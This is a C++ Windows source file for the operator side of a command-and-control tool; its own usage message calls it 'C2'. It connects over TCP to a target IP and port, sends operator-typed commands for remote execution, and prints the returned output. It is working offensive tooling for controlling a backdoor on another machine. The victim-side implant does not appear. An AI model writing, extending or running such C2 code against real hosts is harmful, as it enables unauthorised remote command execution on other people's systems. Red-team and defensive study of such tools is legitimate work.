#include <iostream>
#include <winsock2.h> // Core Sockets (Windows)

#define DEFAULT_PORT 1024
#define DEFAULT_TARGET_IP "127.0.0.1"
#define BUFFER_SIZE 15000

struct SocketInfo {
    SOCKET clientSocket;
    sockaddr_in serverAddress;
};

SocketInfo createClientSocket() {
    WSADATA winSockData; // Initializes Winsock
    if (WSAStartup(MAKEWORD(2, 2), &winSockData) != 0) {
        std::cerr << "WSAStartup failed!" << std::endl;
        exit(1);
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0); // Creates Socket
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    sockaddr_in serverAddress; // Stores Address of Socket
    serverAddress.sin_family = AF_INET; // IPv4

    std::cout << "Client socket created!" << std::endl;
    return {clientSocket, serverAddress};
}

void connectClient(SOCKET clientSocket, sockaddr_in serverAddress, int port) {
    serverAddress.sin_port = htons(static_cast<u_short>(port)); // Set Server Port
    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        exit(1);
    }

    std::cout << "Connected to server!" << std::endl;
}

bool sendCommand(SOCKET clientSocket) {
    std::string command;
    std::cout << "Enter command to execute (type 'exit' to quit): ";
    std::getline(std::cin, command);  // Use getline to capture full command with spaces

    if (command == "exit") {
        send(clientSocket, "exit", 4, 0); // Sending exit signal to the server
        std::cout << "Exiting client." << std::endl;
        return false;  // Exit the function to terminate
    }

    // Send the command to the server
    send(clientSocket, command.c_str(), command.length(), 0);

    // Dynamically allocate memory for the buffer
    char* commandOutput = (char*)malloc(BUFFER_SIZE);
    if (commandOutput == NULL) {
        std::cerr << "Failed to allocate memory for commandOutput." << std::endl;
        return false; // Handle allocation failure
    }

    // Receive data from the client
    int recvResult = recv(clientSocket, commandOutput, BUFFER_SIZE - 1, 0);
    if (recvResult > 0) {
        commandOutput[recvResult] = '\0'; // Null-terminate the received data

        // Check if there's any meaningful output
        if (strlen(commandOutput) == 0) {  // Use strlen since this is a C-style array
            std::cout << "Command output: [No output received]\n";
        } else {
            std::cout << "Command output:\n" << commandOutput << std::endl;

            // Optionally, check if the output contains a known error message
            if (strstr(commandOutput, "Invalid command") != NULL) {
                std::cerr << "Error: Invalid command received from server." << std::endl;
            }
        }
    } else if (recvResult == 0) {
        // Graceful disconnection by the server
        std::cerr << "Server has closed the connection." << std::endl;
    } else {
        // Failure in receiving data
        std::cerr << "Failed to receive output: " << WSAGetLastError() << std::endl;
    }
    
    // Free the allocated memory
    free(commandOutput);
    return true;
}

int main(int argc, char* argv[]) {
    std::string targetIP = DEFAULT_TARGET_IP;
    int port = DEFAULT_PORT;

    // Parse command-line arguments
    if (argc > 2) { 
        targetIP = argv[1]; port = atoi(argv[2]); 
    } else {
        std::cout << "C2 requires at least 2 arguments" << std::endl; return 0;
    }
    
    std::cout << "Connecting to Server IP: " << targetIP << " on Port: " << port << std::endl;

    SocketInfo socketInfo = createClientSocket();
    socketInfo.serverAddress.sin_addr.s_addr = inet_addr(targetIP.c_str()); // Set Server IP
    connectClient(socketInfo.clientSocket, socketInfo.serverAddress, port);

    bool continueRunning = true;
    while (continueRunning) {
        continueRunning = sendCommand(socketInfo.clientSocket);  // Continuously send commands
    }

    // Cleanup socket and Winsock on exit
    closesocket(socketInfo.clientSocket);
    WSACleanup();

    return 0;
}
